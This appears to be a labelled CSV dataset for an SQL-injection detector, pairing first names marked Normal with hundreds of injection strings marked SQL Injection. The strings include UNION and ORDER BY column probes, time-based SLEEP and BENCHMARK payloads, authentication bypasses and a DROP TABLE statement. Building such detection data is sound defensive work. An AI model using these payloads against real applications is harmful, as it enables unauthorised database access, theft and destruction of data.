+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
+'Jill',Normal
+'pg_sleep(5)--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'David',Normal
+'Charlie',Normal
+'Eve',Normal
+'Alice',Normal
+'Charlie',Normal
+'%2c(select%20*%20from%20(select(sleep(10)))a)',SQL Injection
+'ORDER BY 28--',SQL Injection
+'Charlie',Normal
+'Fran',Normal
+'Jill',Normal
+'sleep(5)#',SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Alice',Normal
+'David',Normal
+'-- -	SQL comment',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--'",SQL Injection
+';,SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'ORDER BY 16--',SQL Injection
+'Bob',Normal
+'Grace',Normal
+'Eve',Normal
+'Alice',Normal
+'Hank',Normal
+'Eve',Normal
+'Alice',Normal
+"'"""" or """""""" """"'",SQL Injection
+'John',Normal
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Grace',Normal
+'Charlie',Normal
+'Eve',Normal
+'Fran',Normal
+'Charlie',Normal
+'Eve',Normal
+'Bob',Normal
+'Charlie',Normal
+''^'',SQL Injection
+'ORDER BY 3--',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'ORDER BY 1#',SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'",SQL Injection
+'ORDER BY 11--',SQL Injection
+'ORDER BY 22--',SQL Injection
+'ORDER BY 2--',SQL Injection
+'ORDER BY 30--',SQL Injection
+'Jill',Normal
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
+'Eve',Normal
+'ORDER BY 12',SQL Injection
+'ORDER BY 23#',SQL Injection
+'Bob',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Hank',Normal
+'Charlie',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
+'Jill',Normal
+'Jill',Normal
+'ORDER BY 9--',SQL Injection
+'ORDER BY 11',SQL Injection
+'&&SLEEP(5)--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'ORDER BY 11#',SQL Injection
+'Fran',Normal
+'Hank',Normal
+'/*  	C-style comment',SQL Injection
+'David',Normal
+'David',Normal
+'Jill',Normal
+'||		(double pipe) concatenate',SQL Injection
+'Hank',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'Fran',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#'",SQL Injection
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+'David',Normal
+'/*  	C-style comment',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+';,SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'Hank',Normal
+'ORDER BY 29--',SQL Injection
+'Jill',Normal
+'John',Normal
+'Hank',Normal
+'Alice',Normal
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+"'"""") or sleep(5)=""""'",SQL Injection
+'ORDER BY 23',SQL Injection
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'",SQL Injection
+'John',Normal
+'SLEEP(5)='',SQL Injection
+'Eve',Normal
+'Hank',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+'David',Normal
+"'"""") or true--'",SQL Injection
+"'admin"""") or """"1""""=""""1""""--'",SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'Eve',Normal
+'Fran',Normal
+'1)) or pg_sleep(5)--',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+'Eve',Normal
+'John',Normal
+''-'',SQL Injection
+"'admin""""or 1=1 or """"""""=""""'",SQL Injection
+'admin' --',SQL Injection
+'Fran',Normal
+'Jill',Normal
+'Bob',Normal
+'SLEEP(5)='',SQL Injection
+'Fran',Normal
+''&&SLEEP(5)&&'1',SQL Injection
+'John',Normal
+'Eve',Normal
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'",SQL Injection
+"'admin"""" #'",SQL Injection
+'Eve',Normal
+'Charlie',Normal
+'Alice',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
+'' '',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+'Jill',Normal
+'ORDER BY 5',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+"'benchmark(10000000,MD5(1))#'",SQL Injection
+'ORDER BY 6',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
+"'"""") or true--'",SQL Injection
+'Grace',Normal
+'Eve',Normal
+'Bob',Normal
+'Hank',Normal
+'Grace',Normal
+'ORDER BY 22',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+'Jill',Normal
+'' OR '1',SQL Injection
+'OR 1=1--',SQL Injection
+'admin' --',SQL Injection
+'Hank',Normal
+'ORDER BY 9',SQL Injection
+'Bob',Normal
+'ORDER BY 9',SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
+'waitfor delay '00:00:05'',SQL Injection
+'John',Normal
+'Hank',Normal
+'John',Normal
+'Hank',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'John',Normal
+'Grace',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'' or ''-'',SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
+'Hank',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+'Alice',Normal
+'Grace',Normal
+''&&SLEEP(5)&&'1',SQL Injection
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+'ORDER BY 24#',SQL Injection
+'David',Normal
+'Charlie',Normal
+'Jill',Normal
+'Hank',Normal
+'Bob',Normal
+'Bob',Normal
+'Grace',Normal
+'Eve',Normal
+'ORDER BY 30#',SQL Injection
+'));,SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'ORDER BY 19',SQL Injection
+'' AnD SLEEP(5) ANd '1',SQL Injection
+'John',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
+'David',Normal
+'Grace',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'Eve',Normal
+'/',SQL Injection
+'Alice',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Hank',Normal
+'AND 1=1#',SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'Bob',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4#'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Grace',Normal
+'AND 1=1--',SQL Injection
+'David',Normal
+'Grace',Normal
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
+'Grace',Normal
+'ORDER BY 3--',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
+'Hank',Normal
+"'and (select substring(@@version,2,1))='i''",SQL Injection
+'Hank',Normal
+'Bob',Normal
+'ORDER BY 23',SQL Injection
+'ORDER BY 20#',SQL Injection
+'Hank',Normal
+'WHERE 1=1 AND 1=1',SQL Injection
+'Eve',Normal
+'Jill',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Grace',Normal
+'John',Normal
+'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
+'Alice',Normal
+'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
+'Jill',Normal
+'ORDER BY 5--',SQL Injection
+'Eve',Normal
+'Jill',Normal
+'Alice',Normal
+'Jill',Normal
+'Eve',Normal
+'\\',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'Alice',Normal
+'Hank',Normal
+'Eve',Normal
+'Charlie',Normal
+'Fran',Normal
+'or SLEEP(5)='',SQL Injection
+'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
+'HAVING 1=0',SQL Injection
+"'"""" OR """""""" = """"'",SQL Injection
+'WHERE 1=1 AND 1=1',SQL Injection
+"'admin"""" or 1=1/*'",SQL Injection
+'ORDER BY 23--',SQL Injection
+'' AnD SLEEP(5) ANd '1',SQL Injection
+'Fran',Normal
+');,SQL Injection
+"'"""" or sleep(5)#'",SQL Injection
+'Hank',Normal
+"'""""&""""'",SQL Injection
+'Alice',Normal
+"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
+'Bob',Normal
+'David',Normal
+'David',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Bob',Normal
+"'"""" """"'",SQL Injection
+'Eve',Normal
+'Grace',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'ORDER BY 11--',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+'David',Normal
+'Charlie',Normal
+'1) or pg_sleep(5)--',SQL Injection
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'ORDER BY 2',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+"'admin"""") or (""""1""""=""""1""""--'",SQL Injection
+'Fran',Normal
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Hank',Normal
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+'John',Normal
+'Hank',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+'' AnD SLEEP(5) ANd '1',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'Bob',Normal
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+''*'',SQL Injection
+'John',Normal
+'Grace',Normal
+'Eve',Normal
+'David',Normal
+'Jill',Normal
+'Eve',Normal
+'Alice',Normal
+'Bob',Normal
+'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
+'Alice',Normal
+'AND 1=1--',SQL Injection
+'Grace',Normal
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+'Alice',Normal
+'John',Normal
+'Hank',Normal
+'Bob',Normal
+'Grace',Normal
+'Hank',Normal
+'John',Normal
+'Charlie',Normal
+'' AND 1=0 UNION ALL SELECT 'malicious_data',SQL Injection
+'David',Normal
+'David',Normal
+'Charlie',Normal
+'Charlie',Normal
+'AND 7506=9091 AND (5913=5913',SQL Injection
+'Hank',Normal
+'OR 1=0--',SQL Injection
+'OR x=y--',SQL Injection
+''-'',SQL Injection
+'Grace',Normal
+'John',Normal
+'Alice',Normal
+'Jill',Normal
+'Eve',Normal
+'`	    Backtick',SQL Injection
+'AnD SLEEP(5)',SQL Injection
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Grace',Normal
+'David',Normal
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5--'",SQL Injection
+'UNION ALL SELECT NULL',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'",SQL Injection
+'Bob',Normal
+'Eve',Normal
+'David',Normal
+'\',SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'Hank',Normal
+'Bob',Normal
+"'admin"""" or """"1""""=""""1""""--'",SQL Injection
+'Bob',Normal
+'Charlie',Normal
+'or 1=1',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'",SQL Injection
+'David',Normal
+'Jill',Normal
+'AND 1=0 AND '%'='',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+"'""""'",SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Eve',Normal
+'John',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+'Jill',Normal
+'Charlie',Normal
+'John',Normal
+'Alice',Normal
+''*'',SQL Injection
+'David',Normal
+'Eve',Normal
+'Bob',Normal
+'Alice',Normal
+'John',Normal
+'John',Normal
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+'AND 7300=7300 AND 'pKlZ'='pKlY',SQL Injection
+'Fran',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Bob',Normal
+'Bob',Normal
+'David',Normal
+'');,SQL Injection
+'Alice',Normal
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+'John',Normal
+'Alice',Normal
+'Alice',Normal
+'John',Normal
+''; DROP TABLE users; --',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3#'",SQL Injection
+'Charlie',Normal
+'RANDOMBLOB(500000000/2)',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'Hank',Normal
+"'"""" or """""""" """"'",SQL Injection
+'Alice',Normal
+'UNION ALL SELECT USER()--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+'' OR '1',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
+'Alice',Normal
+'WHERE 1=1 AND 1=0',SQL Injection
+'Fran',Normal
+'John',Normal
+'Jill',Normal
+'ORDER BY 8',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--'",SQL Injection
+'Alice',Normal
+'ORDER BY 12',SQL Injection
+'Jill',Normal
+'David',Normal
+'Eve',Normal
+'David',Normal
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'Eve',Normal
+'/',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Bob',Normal
+'Eve',Normal
+'ORDER BY 21#',SQL Injection
+'Fran',Normal
+'ORDER BY 8#',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+'Eve',Normal
+"'1' GROUP BY 1,2,--+'",SQL Injection
+'ORDER BY 31337--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+"''\""""'",SQL Injection
+'David',Normal
+'John',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Alice',Normal
+'Hank',Normal
+'Fran',Normal
+"'admin"""") or (""""1""""=""""1""""--'",SQL Injection
+"'or benchmark(50000000,MD5(1))'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'ORDER BY 27--',SQL Injection
+"'admin"""") or (""""1""""=""""1'",SQL Injection
+'Eve',Normal
+'Charlie',Normal
